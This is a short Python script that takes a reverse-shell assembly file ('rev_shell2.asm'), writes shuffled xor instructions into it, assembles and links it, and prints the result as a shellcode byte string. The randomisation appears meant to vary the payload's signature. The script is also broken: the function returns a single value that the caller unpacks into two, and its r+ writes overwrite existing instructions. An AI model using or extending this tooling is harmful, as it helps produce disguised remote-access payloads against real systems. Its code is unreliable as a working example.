import os
import random
import subprocess

def read_asm_code():
    random_code = ['\txor rcx,rcx\n','\txor rax,rax\n','\txor rbx,rbx\n','\txor rsi,rsi\n','\txor rdi,rdi\n','\txor rdx,rdx\n']
    random.shuffle(random_code)
    with open('rev_shell2.asm', 'r+') as file:
        for _ in range(3):
            file.readline()

        
        position = file.tell()

        
        file.seek(position)


        for code in random_code:
         file.write(code)
        file.seek(0)
        content = file.readlines()
    subprocess.run(["nasm", "-f", "elf64", "rev_shell2.asm", "-o", "rev_shell2.o"])
    subprocess.run(["ld", "rev_shell2.o", "-o", "rev_shell2"])
    objdump_output = subprocess.run(
        "objdump -d rev_shell2 | grep '^ ' | cut -f2 | awk '{for(i=1;i<=NF;i++) printf \"\\\\x%s\",$i} END {print\"\"}'",
        shell=True, capture_output=True, text=True
    ).stdout
    #calculer la longueur du shellcode 
    shellcode_length = len(objdump_output) // 4 

    return objdump_output


shellcode, shellcode_length = read_asm_code()
print(f"shellcode: {shellcode}")
print(f"taille du shellcode: {shellcode_length}")